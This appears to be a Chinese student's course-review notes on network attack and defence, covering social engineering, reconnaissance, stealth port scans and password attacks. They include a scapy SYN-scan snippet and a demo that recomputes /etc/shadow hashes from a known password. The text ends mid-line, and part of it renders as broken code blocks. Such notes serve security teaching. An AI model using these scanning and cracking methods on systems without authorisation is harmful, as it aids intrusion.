/><p>物理攻击防范Checklist</p><ul><li>笔记本&#x2F;手机防盗: 寝室、食堂、实验室<ul><li>必要时使用笔记本锁</li></ul></li><li>注意真正的桌面安全<ul><li>高价值财物，重要资料文档</li><li>有价值信息: 口令便贴纸，随手记的密码，财务信息，移动硬盘&#x2F;U盘等</li><li>离开时电脑锁定，尽量不让不可信的他人使用自己的电脑&#x2F;U盘等</li></ul></li><li>门禁安全<ul><li>确保门禁关闭，拒绝陌生人(开门、尾随)</li></ul></li></ul><hr><p>社会工程学</p><ul><li>社会工程学攻击的概念<ul><li>社会工程学（Social Engineering）简称社工，它是通过对受害者心理弱点、本能反应、好奇心、信任、贪婪等心理陷阱进行欺骗、伤害的一种危害手端。</li><li>利用人类的愚蠢，操纵他人执行预期的动作或泄漏机密信息的一门艺术与学问。</li><li>社会工程学是一种利用人性弱点而非技术手段进行攻击的方法，包括信息泄露、钓鱼攻击等形式。黑客通过收集个人信息，如Google语法查询，进行信息刺探，构建针对性的诈骗策略。防范措施包括加强个人信息保护意识，避免随意透露信息，以及使用复杂密码等</li></ul></li><li>社会工程学技巧<ul><li>收集个人信息，如Google语法查询，进行信息刺探，构建针对性的诈骗策略</li><li>不引人关注的职业，攻击新员工，伪装身份，正面攻击，构造陷阱施以援手， 制造陷阱骗取同情与帮助，奉承改善自我感觉</li><li>施以小恩小惠，垃圾搜寻，结合多种技术手段</li></ul></li><li>社会工程学防御措施<ul><li>尽可能不要使用真名上网，将真实世界与网络世界划清明确的界限；</li><li>不要轻易相信别人，尤其是未曾谋面或未建立起信任关系的陌生人；</li><li>别把自己的电脑或移动终端轻易留给别人使用，必要时刻(如维修电脑时)务必清理上面的个人隐私信息，否则结果可能会很惨；</li><li>单位应建立起规范的安全操作规程，包括门禁和人员控制，不同分类资料数据的访问机制，规范的垃圾回收和处理机制等；</li><li>单位应对员工进行安全意识和操作规程培训，使其具备基础的社会工程学抵御能力。</li><li>涉密信息与计算机系统的处理有着相应更加严格的保密流程与规范。</li></ul></li></ul><h1 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h1><p>看看ppt，</p><ul><li>公开信息收集的定义、内容、分类及必要性</li><li><strong>网络扫描的类型</strong>(主机&#x2F;端口&#x2F;操作系统类型扫描)、<strong>原理</strong>（知道常用服务的端口是啥，21是ftp，注意ppt里的那个照片！！什么是<strong>半连接</strong>、什么是、返回的数据类型不用背，例如：TTL小于等于64）<ul><li>简答题！！！</li></ul></li><li>漏洞扫描的目的、原理、组件及方法</li><li>网络拓扑探测（拓扑探测\网络设备识别\网络实体IP地理位置定位）</li></ul><h2 id="2-1-公开信息收集的定义、内容、分类及必要性"><a href="#2-1-公开信息收集的定义、内容、分类及必要性" class="headerlink" title="2.1.公开信息收集的定义、内容、分类及必要性"></a>2.1.公开信息收集的定义、内容、分类及必要性</h2><p>定义</p><ul><li>信息收集是指黑客为了更加有效地实施攻击而在攻击前或攻击过程中对目标的所有探测活动。 </li><li>信息收集技术是一把双刃剑<ul><li>黑客需要收集信息，才能有效的实施攻击</li><li>管理员使用信息收集技术可以发现系统的弱点</li></ul></li></ul><hr><p>内容</p><ul><li>域名、IP地址、端口</li><li>防火墙、入侵检测等安全防范措施</li><li>内部网络结构、域组织、用户电子邮件</li><li>操作系统类型</li><li>系统构架</li><li>敏感文件或目录</li><li>应用程序类型</li></ul><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-27 16.10.33.png" alt="截屏2024-12-27 16.10.33" style="zoom: 33%;" /><hr><p>信息收集的分类</p><ul><li>主动：通过直接访问、扫描网站，这种将流量流经网站的行为<ul><li>主动方式，你能获取更多的信息，但是目标主机可能会记录你的操作记录。</li></ul></li><li>被动：利用第三方的服务对目标进行 访问了解，比例：Google搜索<ul><li>被动方式，你收集的信息会相对少，但是你的行动 并不会被目标主机发现。</li></ul></li></ul><blockquote><p>一般在一个渗透项目下，你需要有多次的信息收集，同时也要运用不同的收集方式，才能保证信息收集的完整性。这章我们将介绍主动和被动的信息收集方式，来收集一个目标的信息。</p></blockquote><ul><li><p>利用web服务</p><ul><li><p>网站所有者信息：通过社会工程学可以得到邮编、地址、公司人员名单、电话、邮箱、版本号</p></li><li><p>网站服务器对应的IP</p><ul><li>利用DNS服务器：提供域名到IP地址的映射<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping www.sina.com.cn</span><br><span class="line"></span><br><span class="line">Reply from 202.108.33.32 <span class="keyword">time</span>=11ms  TTL=245 202.108.33.32</span><br></pre></td></tr></table></figure>得到域名的IP地址映射为<code>202.108.33.32</code></li></ul></li><li><p>获取目标网络拓扑结构：子域名、网络拓扑图、IP分配表</p></li></ul></li><li><p>利用搜索引擎服务</p><ul><li>Google Hacking：语法、关键字→网站配置信息、后门信息<ul><li>语法：<ul><li>基本语法：and ,or, +, -, “”, .(单字符匹配), *(0或多字符匹配)</li><li>高级操作符：site, link, inurl, intitle, intext. filetype</li></ul></li></ul></li><li>Shodan，ZoomEye，FOFA</li></ul></li><li><p>利用WhoIs服务</p><ul><li>功能：查询已注册域名的拥有者信息，如域名登记人信息、联系电话和邮箱、域名注册时间和更新时间、权威DNS的IP地址</li><li>查询途径：<ul><li>网站，如站长之家<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></li><li>企业的备案信息：如国家企业信用信息公示系统、ICP备案查询网</li></ul></li></ul></li><li><p>利用DNS域名服务</p><ul><li>DNS：提供域名到IP地址的映射<ul><li>权威DNS——主DNS</li><li>Cache-Only DNS——副DNS</li></ul></li><li>如果DNS配置不当，可能造成内部主机名和IP地址对的泄露</li><li>CDN<ul><li>CDN（Content Delivery Network）的缩写，是一种利用分布式节点技术，在全球部署服务器，即时地将网站、应用视频、音频等静态或动态资源内容分发到用户所在的最近节点，提高用户访问这些内容的速度和稳定性，降低网络拥塞和延迟，同时也能减轻源站的压力。提高网络或应用的可用性和安全型。<br>CDN的基本原理是将源站的内容分发到离用户最近的节点上进行缓存，并通过智能路由、负载均衡等技术来保证用户能够快速、稳定地访问到所需资源。CDN将源站与用户之间的网络传输距离缩短，通过多节点并行传输，从而显著降低了网络传输的延迟和带宽消耗。</li></ul></li><li>nslookup<ul><li>Nslookup可查到域名服务器地址和IP地址，以及域名服务器的传输内容</li></ul></li></ul></li></ul><hr><p>必要性？</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-27 16.15.23.png" alt="截屏2024-12-27 16.15.23" style="zoom: 33%;" /><h2 id="2-2-网络扫描的类型-主机-端口-系统类型扫描-、原理"><a href="#2-2-网络扫描的类型-主机-端口-系统类型扫描-、原理" class="headerlink" title="2.2.网络扫描的类型(主机\端口\系统类型扫描)、原理"></a>2.2.网络扫描的类型(主机\端口\系统类型扫描)、原理</h2><p>网络扫描的类型(主机&#x2F;端口&#x2F;操作系统类型扫描)、原理（知道常用服务的端口是啥，21是ftp，注意ppt里的那个照片！！什么是半连接、什么是、返回的数据类型不用背，例如：TTL小于等于64）</p><blockquote><p>有些操作系统实现TCP&#x2F;IP时并没有完全遵循RFC标准，导致部分扫描看不到效果。</p></blockquote><h3 id="2-2-1-主机扫描"><a href="#2-2-1-主机扫描" class="headerlink" title="2.2.1.主机扫描"></a>2.2.1.主机扫描</h3><ul><li><p>ping：request8，reply0</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-27 16.59.12.png" alt="截屏2024-12-27 16.59.12" style="zoom: 33%;" /><p>IP协议（Internet Protocol）是网络层的协议；ICMP协议是网络层协议，封装在IP数据报中，主要功能就是<code>ping命令</code>和<code>tracert命令</code>，可以检查网络的连通性和显示经过路径。<br>常用的ICMP报文</p></li></ul><table><thead><tr><th>名称</th><th>类型</th></tr></thead><tbody><tr><td>ICMP Destination Unreachable（目标不可达）</td><td>3</td></tr><tr><td>ICMP Source Quench（源抑制）</td><td>4</td></tr><tr><td>ICMP Redirection（重定向）</td><td>5</td></tr><tr><td>ICMP Timestamp Request&#x2F;Reply（时间戳）</td><td>13&#x2F;14</td></tr><tr><td>ICMP Address Mask Request&#x2F;Reply（子网掩码）</td><td>17&#x2F;18</td></tr><tr><td>ICMP Echo Request&#x2F;Reply（响应请求&#x2F;应答）</td><td>8&#x2F;0</td></tr></tbody></table><ul><li><p>Ping的实现机制（<strong>原理</strong>）</p><ul><li>向目标主机发送ICMP Echo Request (type 8)数据包，等待回复的ICMP  Echo Reply 包(type 0) 。</li><li>数据区包含了一些随机测试数据，如”ABCDEFG….”等</li></ul></li><li><p>高级IP扫描技术</p><ul><li><p>在IP头中设置无效的字段值：向目标主机发送包头错误的IP包，目标主机或过滤设备会反馈ICMP Parameter Problem Error信息。</p></li><li><p>错误的数据分片：向目标主机发送的IP包中填充错误的分段值，目标主机或 过滤设备会反馈ICMP Destination Unreachable信息。</p><blockquote><p>向目标主机发送一个IP数据报，但是协议项是错误的，比如协议项不可用，那么目标将返回Destination Unreachable的ICMP报文，但是如果是在目标主机前有一个防火墙或者一个其他的过滤装置，可能过滤掉提出的要求，从而接收不到任何回应。可以使用一个非常大的协议数字来作为IP头部的协议内容，而且这个协议数字至少在今天还没有被使用，应该主机一定会返回Unreachable，如果没有Unreachable的ICMP数据报返回错误提示，那么就说明被防火墙或者其他设备过滤了，我们也可以用这个办法来探测是否有防火墙或者其他过滤设备存在。</p><p>利用IP的协议项来探测主机正在使用哪些协议，我们可以把IP头的协议项改变，因为是8位的，有256种可能。通过目标返回的ICMP错误报文，来作判断哪些协议在使用。如果返回Destination Unreachable，那么主机是没有使用这个协议的，相反，如果什么都没有返回的话，主机可能使用这个协议，但是也可能是防火墙等过滤掉了。NMAP的IP Protocol scan也就是利用这个原理。 </p><p>我们能够利用上面这些特性来得到防火墙的ACL（access list），甚至用这些特性来获得整个网络拓扑结构。如果我们不能从目标得到Unreachable报文或者分片组装超时错误报文，可以作下面的判断： </p><p>1、防火墙过滤了我们发送的协议类型 </p><p>2、防火墙过滤了我们指定的端口 </p><p>3、防火墙阻塞ICMP的Destination Unreachable或者Protocol Unreachable错误消息。 </p><p>4、防火墙对我们指定的主机进行了ICMP错误报文的阻塞。</p></blockquote></li></ul></li></ul><h3 id="2-2-2-端口扫描"><a href="#2-2-2-端口扫描" class="headerlink" title="2.2.2.端口扫描"></a>2.2.2.端口扫描</h3><p>端口是通信的通道，端口分为TCP端口与UDP端口。因此，端口扫描可分类为TCP扫描、UDP扫描</p><ul><li>TCP扫描：connect、SYN、NULL、Xmas、ACK、FIN</li><li>UDP扫描</li></ul><p><img src="/./attachments/image-20241227171021035.png" alt="image-20241227171021035"></p><ul><li>53&#x3D;DNS</li></ul><p>TCP的协议号为6，UDP的协议号为17。ICMP的协议号为1。</p><h4 id="2-2-2-1-基本的扫描方法即TCP-Connect扫描"><a href="#2-2-2-1-基本的扫描方法即TCP-Connect扫描" class="headerlink" title="2.2.2.1.基本的扫描方法即TCP Connect扫描"></a>2.2.2.1.基本的扫描方法即<strong>TCP Connect扫描</strong></h4><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-27 21.06.23.png" alt="截屏2024-12-27 21.06.23" style="zoom: 33%;" /><p>扫描端与目标主机建立tcp连接，完成三次握手后，扫描端主动关闭连接(缺点：目标主机会记录下连接内容)。</p><ul><li>优点<ul><li>实现简单</li><li>可以用普通用户权限执行</li></ul></li><li>缺点<ul><li>容易被目标应用日志所记录</li></ul></li></ul><hr><p><strong>隐秘扫描</strong></p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-27 17.22.51.png" alt="截屏2024-12-27 17.22.51" style="zoom: 33%;" /><p>隐秘端口扫描技术有</p><ul><li>TCP SYN</li><li>TCP null, Xmas</li><li>TCP Window</li><li>TCP ACK</li><li>FTP Proxy</li><li>idle</li><li>IP分段扫描</li></ul><hr><h4 id="2-2-2-2-SYN扫描"><a href="#2-2-2-2-SYN扫描" class="headerlink" title="2.2.2.2.SYN扫描"></a>2.2.2.2.SYN扫描</h4><p>半连接扫描（Half-Open Scan）是一种常见的端口扫描技术之一。 它也被称为SYN扫描（SYN Scan）</p><blockquote><p>半连接扫描：服务器和客户端建立TCP连接会发生三次握手，客户端先发送一个SYN数据报给服务器，如果端口开放，服务器会会返回一个标志位是SYN和ACK的数据报给客户端，如果端口没有开 放，则会返回一个标志位是RST和ACK的数据报，<strong><u>为了不留下连接日志</u></strong>，客户端此时不需要返回 ACK来建立连接。</p></blockquote><ul><li>扫描者向目标主机发送一个SYN，<ul><li>如果目标主机回复了<strong>一个SYN&#x2F;ACK</strong>数据包，那么说明主机存活，</li><li>如果收到<strong>一个RST&#x2F;ACK</strong>数据包，那么主机没有存活；</li><li>如果没有收到回复则表示被过滤。</li></ul></li><li>因为扫描者只向目标主机发送了SYN，并没有和目标主机进行连接， 因此称为半连接。</li></ul><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-27 17.23.01.png" alt="截屏2024-12-27 17.23.01" style="zoom: 33%;" /><hr><p>SYN扫描的实现</p><ul><li>WinSock2接口Raw Sock方式，允许自定义IP包</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SockRaw = socket(AF_INET , SOCK_RAW , IPPROTO_IP);</span><br></pre></td></tr></table></figure><ul><li>Python</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = IP(dst=ip) / TCP(dport=<span class="built_in">int</span>(port), flags=“S<span class="string">&quot;)</span></span><br><span class="line"><span class="string">ans = sr1(p, timeout=1, verbose=1)</span></span><br></pre></td></tr></table></figure><hr><p>SYN扫描的优缺点</p><ul><li>优点：<ul><li>一般不会被目标主机的应用所记录</li><li>这种技术主要用于躲避防火墙的检测</li></ul></li><li>缺点：<ul><li>运行Raw Socket时必须拥有管理员权限</li></ul></li></ul><h4 id="2-2-2-3-ACK扫描"><a href="#2-2-2-3-ACK扫描" class="headerlink" title="2.2.2.3.ACK扫描"></a>2.2.2.3.ACK扫描</h4><p>ACK，设置flags位为ACK，不回复表示端口关闭或被过滤，如果回复的数据包TTL小于等于64表示端口开放，大于64端口关闭 (windows)。</p><blockquote><p>ACK扫描，即向目标主机发送ACK数据包， ACK扫描方式与前者不同，它无法确定端口处于open还是 closed，它的作用是确定防火墙是否启用，即端口是否被过滤。 </p><p><em>ACK 扫描不是用于发现端口开启或关闭状态的，而是用于发现服务器上是否存在有状态防火墙的。 它的结果只能说明端口是否被过滤，不能说明端口是否处于开启或关闭状态。</em></p><p>ACK扫描探测报文只设置ACK标志位。 </p><ul><li>当扫描未被过滤的系统时，open和closed端口都会返回RST报文。Nmap把它们标记为 unfiltered，但至于它们是open或者 closed 无法确定； </li><li>不响应的端口或者发送特定的ICMP错误消息的端口，标记为 filtered(被过滤的)，即有防火墙的存在。<ul><li>向目标主机的端口发送ACK包，如果收到RST包，说明该端口没有被防火墙屏蔽</li><li>向目标主机的端口发送ACK包，如果没有收到RST包，说明被防火墙屏蔽。</li></ul></li></ul></blockquote><h4 id="2-2-2-4-FIN扫描"><a href="#2-2-2-4-FIN扫描" class="headerlink" title="2.2.2.4.FIN扫描"></a>2.2.2.4.FIN扫描</h4><p> FIN，FIN扫描和NULL扫描类似，将标志位FIN置1。如果端口开放，则没有反应；端口关闭，目标主机会发送RST。</p><ul><li><p>对FIN报文的回复（Fin、Xmas、NULL扫描均是这样的）</p><ul><li><p>TCP标准</p><ul><li>关闭的端口——返回RST报文</li><li>打开的端口——忽略</li></ul></li><li><p>BSD操作系统（Unix操作系统）<br><a href="https://deepinout.com/os/os-top-articles/1694545611_j_bsd-based-operating-system.html">https://deepinout.com/os/os-top-articles/1694545611_j_bsd-based-operating-system.html</a></p><ul><li>与TCP标准一致</li></ul></li><li><p>其他操作系统（Windows操作系统）</p><ul><li><p>均返回RST报文</p><blockquote><p>并非所有的系统平台都遵循了词条RFC规定。在这些平台（包含Windows）上，针对这样的 不含SYN、RST、ACK的报文，端口无论开放或者关闭，都会返回RST，导致所有端口都被标记为 closed 。并且这类扫描不能辨别端口是 open 还是 filtered 。</p></blockquote></li></ul></li></ul></li></ul><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-27 21.04.17.png" alt="截屏2024-12-27 21.04.17" style="zoom: 33%;" /><h4 id="2-2-2-5-Null扫描"><a href="#2-2-2-5-Null扫描" class="headerlink" title="2.2.2.5.Null扫描"></a>2.2.2.5.Null扫描</h4><p>Null，设置flags位为空，不回复则表示端口开启，回复并且回复的标志位为RST表示端口关闭</p><h4 id="2-2-2-6-Xmas扫描"><a href="#2-2-2-6-Xmas扫描" class="headerlink" title="2.2.2.6.Xmas扫描"></a>2.2.2.6.Xmas扫描</h4><p>Xmas，设置所有标志位，不回复则表示端口开启，回复并且回复的标志位为RST表示端口关闭</p><h4 id="2-2-2-7-Windows扫描"><a href="#2-2-2-7-Windows扫描" class="headerlink" title="2.2.2.7.Windows扫描"></a>2.2.2.7.Windows扫描</h4><p>窗口扫描其实与ACK扫描差不多，它会分析返回的RST报文。 它与ACK扫描一样，发送TCP ACK数据包，但是将TCP 窗口字段设为非零值，意在与对方服务器商讨窗口范围。 </p><ul><li>如果服务器返回的RST报文中，窗口值的大小为正数，那么该端口的状态为 open ; </li><li>如果为0，则 closed<ul><li>而ACK扫描仅会将其判定为 unfiltered</li></ul></li></ul><h4 id="2-2-2-8-回答问题：样例程序中“conf-L3socket-L3RawSocket”的作用-是什么？"><a href="#2-2-2-8-回答问题：样例程序中“conf-L3socket-L3RawSocket”的作用-是什么？" class="headerlink" title="2.2.2.8.回答问题：样例程序中“conf.L3socket&#x3D;L3RawSocket”的作用 是什么？"></a>2.2.2.8.回答问题：样例程序中“conf.L3socket&#x3D;L3RawSocket”的作用 是什么？</h4><p> 答：scapy不适用于本机和环回端口，这段代码使其够用来扫描本地主机。</p><p> 分析： scapy 在默认情况下是无法直接发送 ICMP 包到本机的，在Linux上需要设置 conf.L3socket&#x3D;L3RawSocket ，采用原生套接字接口发送，否则无法捕获环回地址的包（无法直接发 送 ICMP 包到本机），会出现问题。 </p><p>在Ubuntu（Linux）操作系统内，通过添加代码段 conf.L3socket&#x3D;L3RawSocket ， scapy 就可以直接 发送 ICMP 包到本机，从而可以捕获环回的数据包。</p><p>与之相对应的，在Windows操作系统下，则不需要 conf.L3socket&#x3D;L3RawSocket ，本机就可正常捕获环回地址的数据包，因此在win下需要将这行代码 注释掉</p><h4 id="2-2-2-9-总结"><a href="#2-2-2-9-总结" class="headerlink" title="2.2.2.9.总结"></a>2.2.2.9.总结</h4><p>一个端口扫描的结果有三种：开放、关闭、被过滤（或者是未被过滤），被过滤的结果不能够判断端口 到底有没有开放，但可以判断出目标主机有防火墙拦截，所以被过滤这种结果并不是没有意义的。端口 扫描的意义是区分这三种情况。 </p><p>半开放连接扫描可以根据返回数据报的类型判断是开放还是关闭，通过是否返回数据报判断扫描信息是 否被过滤；</p><p>但FIN，Null，Xmas扫描则不同，其本质是一个开放的端口收到没有设置SYN,ACK或RST标志位的异常数据报时，不会做出反应，而如果这个端口是关闭的，他会返回一个标志位是RST的数据报，这是由TCP协议本身决定的。</p><p>但这三种方法有局限性，体现在：1）不同操作系统在对待这类事件做 出的反应不同 2）如果发送出去的数据报丢失，如被防火墙拦截，会被误判成端口开放的情况；ACK扫 描不能决定一个端口是否开放 ，只能判断目标是否有防火墙，所以在实际中可以先使用ACK扫描检查防火墙的状态。</p><h3 id="2-2-3-系统扫描"><a href="#2-2-3-系统扫描" class="headerlink" title="2.2.3.系统扫描"></a>2.2.3.系统扫描</h3><ul><li>根据端口扫描结果分析，操作系统的特有功能会打开特定的端口</li><li>连接服务器程序时所给出的欢迎信息BANNER：FTP、SSH、Telnet</li><li>TCP&#x2F;IP协议栈指纹：不同的操作系统在实现TCP&#x2F;IP协议栈时都或多或少地存在着差异。而这些 差异，我们就称之为TCP&#x2F;IP协议栈指纹。</li></ul><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2024-12-27 19.17.18.png" alt="截屏2024-12-27 19.17.18" style="zoom: 33%;" /><h2 id="2-3-漏洞扫描的目的、原理、组件及方法"><a href="#2-3-漏洞扫描的目的、原理、组件及方法" class="headerlink" title="2.3.漏洞扫描的目的、原理、组件及方法"></a>2.3.漏洞扫描的目的、原理、组件及方法</h2><p>在计算机安全领域，安全漏洞（SecurityHole）通常又称作脆弱性（vulnerability）。</p><p>漏洞的来源漏洞的来源:  </p><p>（1）硬件、软件或协议设计时的瑕疵 </p><p>（2）硬件、软件或协议实现中的弱点 </p><p>（3）硬件、软件本身的瑕疵 </p><p>（4）系统和网络的错误配置</p><hr><p>漏洞扫描：指利用一些专门或综合漏洞扫描程序对目标存在的系统漏洞或应用程序漏洞进行扫描。</p><hr><p>漏洞扫描的缺陷： </p><p>(1) 报告并不一定可靠</p><p>(2) 易暴露目标</p><hr><p>漏洞数据库：X-Force，CVE、国家漏洞库</p><hr><p>漏洞检测技术：</p><p>漏洞检测就是对重要计算机信息系统进行检查，发现其中可被黑客利用的漏洞。该技术通常采用两种策略，即被动式策略和主动式策略。</p><ul><li><p>被动式策略是基于主机的检测，对系统中不合适的设置、 脆弱的口令以及其他同安全规则相抵触的对象进行检查；</p></li><li><p>主动式策略是基于网络的检测，通过执行一些脚本文件对系统进行攻击，并记录它的反应，从而发现其中的漏洞。</p><blockquote><p>被动式策略：基于主机，检查安全规则</p><p>主动式策略：基于网络，执行脚本攻击</p></blockquote></li></ul><hr><p>漏洞检测方法：</p><ul><li>直接测试：具有针对性，需要根据漏洞特点进行排查，可能对系统造成破坏</li><li>推断：不利用系统漏洞而判断漏洞是否存在的方法，它并不直接渗透漏洞，只是间接地寻找漏洞存在的证。版本检查、程序行为分析、操作系统堆栈指纹分析和时序分析等</li><li>带凭证的测试：凭证是指访问服务所需要的用户名或者密码，包括UNIX的登录权限和从网络调用Windows NT的API的能力。具有用户权限<ul><li>除了目标主机IP地址以外，直接测试和推断两种方法都不需要其他任 何信息。然而，很多攻击都是拥有UNIX shell访问权限或者NT资源访问权限 的用户发起的，他们的目标在于将自己的权限提升成为超级用户，从而可以 执行某个命令。对于这样的漏洞，前两种方法很难检查出来。因此如果赋予 测试进程目标系统的角色，将能够检查出更多的漏洞。这种方法就是带凭证 的测试。</li></ul></li></ul><hr><p>漏洞扫描软件</p><p>Nessus、Xscan</p><h2 id="2-4-网络拓扑探测（拓扑探测-网络设备识别-网络实体IP地理位置定位）"><a href="#2-4-网络拓扑探测（拓扑探测-网络设备识别-网络实体IP地理位置定位）" class="headerlink" title="2.4.网络拓扑探测（拓扑探测\网络设备识别\网络实体IP地理位置定位）"></a>2.4.网络拓扑探测（拓扑探测\网络设备识别\网络实体IP地理位置定位）</h2><ul><li><p>拓扑探测：traceroute（用来发现实际的路由路径）、SNMP（简单网络管理协议，不同类型网络设备之间客户机&#x2F;服务器模式的简单通信协议，是一种用于监控和管理网络设备的协议，它允许网络管理员远程管理设备，监控性能数据，并对设备进行配置更改）</p><ul><li><pre><code class="language-bash">C:\&gt;tracert www.bupt.edu.cnTracing route to www.bupt.edu.cn[202.112.96.163]over a maximum of 30 hops:1 &lt;10 ms &lt;10 ms &lt;10 ms 162.105.X.X2 &lt;10 ms &lt;10 ms &lt;10 ms 162.105.254.2503 &lt;10 ms &lt;10 ms &lt;10 ms 162.105.253.2504 &lt;10 ms 10 ms &lt;10 ms pku0.cernet.net [202.112.38.73]…….10 &lt;10 ms &lt;10 ms &lt;10 ms www.bupt.edu.cn [202.112.96.163]Trace complete.<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  - SNMP的两个基本命令模式：</span><br><span class="line"></span><br><span class="line">    - Read：观察设备配置信息。</span><br><span class="line">    - Read/Write：有权写入信息</span><br><span class="line"></span><br><span class="line">- 网络设备（路由器、交换机）识别</span><br><span class="line"></span><br><span class="line">  - 搜索引擎：Shodan、ZoomEye、FOFA</span><br><span class="line">  - 基于设备指纹的设备类型探测</span><br><span class="line">    Banner信息的获取渠道：</span><br><span class="line">    - FTP协议</span><br><span class="line">    - SSH</span><br><span class="line">    - Telnet</span><br><span class="line">    - HTTP</span><br><span class="line"></span><br><span class="line">- 网络实体IP地理位置定位</span><br><span class="line"></span><br><span class="line">  - 基于查询信息的定位：通过查询机构注册的信息确定网络设备的地理位置</span><br><span class="line">  - 基于网络测量的定位：利用探测源与目标实体的时延、拓扑或其他信息估计目标实体的位置。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 3.口令攻击</span><br><span class="line"></span><br><span class="line">- 口令的定义及作用（操作系统口令）</span><br><span class="line">- 针对口令强度的攻击方法</span><br><span class="line">  - （看看ppt）</span><br><span class="line">- 针对口令存储的攻击方法</span><br><span class="line">  - （看看ppt）（口令存在那个文件里面！）</span><br><span class="line">- 针对口令传输的攻击方法（嗅探攻击、键盘记录、钓鱼、重放）</span><br><span class="line">  - （看看ppt）</span><br><span class="line">- 口令攻击的防范方法</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 3.1.口令的定义及作用（操作系统口令）</span><br><span class="line"></span><br><span class="line">身份认证（Identification and Authentication）：用户向计算机系统以一种安全的方式提交自己的身份证明，然后由系统确认用户的身份是否属实，最终拒绝用户或者赋予用户一定的权限。</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/image-20241227213822494.png&quot; alt=&quot;image-20241227213822494&quot; style=&quot;zoom: 33%;&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;u&gt;口令是身份认证的一种方式，只有经过授权的合法用户才能访问计算机系统&lt;/u&gt;</span><br><span class="line"></span><br><span class="line">（计算机领域中的身份认证：用户名和密码验证、磁卡或者智能卡认证、基于人的生理特征认证、基于地理位置的认证、其它的特殊的认证方式。）</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line">口令攻击是黑客通过获取系统管理员或其他用户的口令，获得系统的管理权，窃取系统信息、磁盘中的文件甚至对系统进行破坏。</span><br><span class="line"></span><br><span class="line">根据攻击者获取口令方式不同分为：</span><br><span class="line"></span><br><span class="line">- 针对口令强度的攻击</span><br><span class="line">- 针对口令存储的攻击</span><br><span class="line">- 针对口令传输的攻击</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 3.2.针对口令强度的攻击方法</span><br><span class="line"></span><br><span class="line">- 字典攻击：统计使用概率高的口令放在字典文件内，还可以通过不同的变异规则生成猜测字典</span><br><span class="line">- 暴力破解：排列组合，速度足够快的计算机能尝试字母、数字、特殊字符所有的组合，将最终破解所有的口令</span><br><span class="line">- 组合攻击：攻击者通过收集在网络上已泄露的用户名、口令等信息，之后用这些账号和口令尝试批量登录其他网站，最终得到可以登录这些网站的用户账号和口令（这种攻击方式强调的是“组合”，即攻击者可能会将收集到的不同来源的用户名和密码进行配对组合。攻击者可能会尝试多种组合，比如将A网站的用户名与B网站的密码组合，或者将A网站的用户名与C网站的密码组合，以此类推）</span><br><span class="line">- 撞库攻击：黑客通过收集互联网已泄露的用户和密码信息，生成对应的字典表，尝试批量登录其他网站后，得到一系列可以登录的用户。通过获取用户在A网站的账户从而尝试登录B网址，这就可以理解为撞库攻击（撞库攻击依赖于用户在不同网站使用相同或相似的用户名和密码的习惯）</span><br><span class="line">- 彩虹表攻击：破解MD5、HASH。彩虹表就是一种破解哈希算法的技术，主要可以破解MD5、HASH等多种密码</span><br><span class="line">  - 对抗彩虹表攻击的方法：&lt;u&gt;加盐&lt;/u&gt;</span><br><span class="line">    比如批处理字典攻击中的彩虹表攻击，它需要通过大量常用密码预先计算哈希值来存表，而如果密码文件已加盐，对于彩虹表密码文件的要求从包含常用密码变为了包含预先隐藏的（盐，密码），那么彩虹表将会因为盐的随机性而过大。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 3.3.针对口令存储的攻击方法</span><br><span class="line"></span><br><span class="line">（口令存在哪个文件里面！）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 3.3.1.Linux</span><br><span class="line"></span><br><span class="line">Linux口令存储：`/etc/password`和`/etc/shadow`</span><br><span class="line"></span><br><span class="line">shadow文件中密码字段的组成：算法、salt、密码哈希值（多轮哈希可减缓暴力破解）（加密后的口令字符串）</span><br><span class="line"></span><br><span class="line">![截屏2024-12-27 22.07.42](./attachments/截屏2024-12-27 22.07.42.png)</span><br><span class="line"></span><br><span class="line">![image-20221226161907561](./attachments/image-20221226161907561.png)</span><br><span class="line"></span><br><span class="line">**salt**：加盐，就是在哈希时添加随机字符串，防止字典攻击和彩虹表攻击</span><br><span class="line"></span><br><span class="line">-  使用salt时，相同的输入可能导致不同的散列</span><br><span class="line">- 密码散列=单向散列循环（密码||随机字符串）</span><br><span class="line">- 随机字符串就是salt</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">The two password entries:</span><br><span class="line">seed:$6$wDRrWCQz$IsBXp9.9wz9SG(omitted)sbCT7hkxXY/:17372:0:99999:7::::  </span><br><span class="line">test:$6$a6ftg3SI$apRiFL.jDCH7S(omitted)jAPXtcB9oC0:17543:0:99999:7::::</span><br><span class="line">---------------------------------------</span><br><span class="line">$ python</span><br><span class="line">&gt;&gt;&gt; import crypt</span><br><span class="line">&gt;&gt;&gt; print crypt.crypt(&#x27;dees&#x27;,&#x27;$6$wDRrWCQz$&#x27;)  </span><br><span class="line">$6$wDRrWCQz$IsBXp9.9wz9SG(omitted)sbCT7hkxXY/</span><br><span class="line">&gt;&gt;&gt; print 